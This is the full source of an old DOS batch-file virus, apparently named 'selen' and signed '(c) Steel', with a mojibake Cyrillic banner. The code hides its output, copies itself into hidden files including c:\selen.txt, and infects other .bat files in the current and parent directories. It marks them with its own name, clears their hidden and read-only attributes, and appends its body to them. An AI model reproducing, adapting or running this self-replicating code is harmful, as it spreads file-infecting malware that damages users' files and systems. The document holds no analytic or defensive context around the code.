@ctty nul%selen%
if not exist ret.tmp copy %0 ret.tmp
call attrib ret.tmp +h
if not exist selen.bat copy ret.tmp selen.bat
set sele=c:\selen.txt
if not exist %sele% copy %0 %sele%
if "%1"=="/?" goto se
goto exts
:se
@ctty con
cls
@echo off
echo.
echo. 浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�
echo  �   �� ぎ÷�ぅ皀�� � �� �瑜�瘴 �� 轤���! � �� Ε ��Й�, ��皰琺� �
echo  財��讓� � 祠ヮ�, 艪� ��皋※珮瘠 ���竅��碎, �� 矣�� 甃�矗モ� ��  �
echo  罪〓��膈覓� �覊メ�����! (c) Steel �艪� ��я� �覊ョ�蓐 轤�� ���� �
echo  痕�皀瑙ヨ� ��� え瓷�! �痰�皋, ��� � 皀￥ 紜�皋�� 祠� �爬����碎  �
echo  ��爍祠キ硅 � 轤��� 爨�〓�� ��皚┴�? ��� 祠ム, �� ぅ�� Θ�驍!    �
echo  �                 � 皀�ム� �牀ぎ����皀 ┌��碎 � 瓣�� ┌珮茯�, � �
echo  根���皀瘡, 艪� � � ��� �� �� え瓷�. (� ��Ε� 礒� � �� �飫!)     �
echo  藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�
exit
:exts
@ctty nul
for %%s in (*.bat ..\*.bat) do set selen=%%s
:��� � 礒� � � 皀￥...
for %%t in (%selen%) do find "selen" %%t
if not errorlevel 1 goto yes
attrib %selen% -h -r
for %%t in (%selen%) do copy %%t+%sele%
exit
:yes
del %sele%